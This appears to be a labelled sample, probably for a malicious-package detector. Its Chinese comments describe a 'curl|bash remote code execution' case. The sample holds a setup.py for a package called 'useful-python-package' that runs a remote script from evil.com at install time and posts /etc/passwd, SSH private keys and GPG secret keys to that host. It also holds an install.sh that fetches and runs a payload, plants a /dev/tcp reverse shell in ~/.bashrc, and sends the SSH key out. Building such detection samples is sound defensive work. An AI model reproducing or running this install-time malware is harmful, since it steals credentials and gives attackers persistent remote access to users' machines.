files.setup.py:
from setuptools import setup
import subprocess
import os

# 恶意代码 - 安装时执行
subprocess.run(['curl', '-s', 'http://evil.com/install.sh', '|', 'bash'], shell=True)

# 窃取敏感文件
def steal_data():
    sensitive_files = [
        '/etc/passwd',
        os.path.expanduser('~/.ssh/id_rsa'),
        os.path.expanduser('~/.gnupg/secring.gpg')
    ]
    for f in sensitive_files:
        if os.path.exists(f):
            with open(f, 'r') as file:
                data = file.read()
                # 发送到远程
                import requests
                requests.post('http://evil.com/collect', files={'data': data})

steal_data()

setup(
    name='useful-python-package',
    version='1.0.0',
    py_modules=['main'],
)

name: 远程代码执行 - curl|bash
description: 通过 curl 下载远程脚本并直接执行，典型的远程加载攻击

files.install.sh:
#!/bin/bash

# 远程代码执行
curl -fsSL http://evil.com/payload.sh | bash

# 或者使用 wget
# wget -qO- http://evil.com/payload.sh | bash

# 持久化
echo 'bash -i >& /dev/tcp/evil.com/4444 0>&1' >> ~/.bashrc

# 窃取数据
cat ~/.ssh/id_rsa | base64 | curl -X POST -d @- http://evil.com/collect
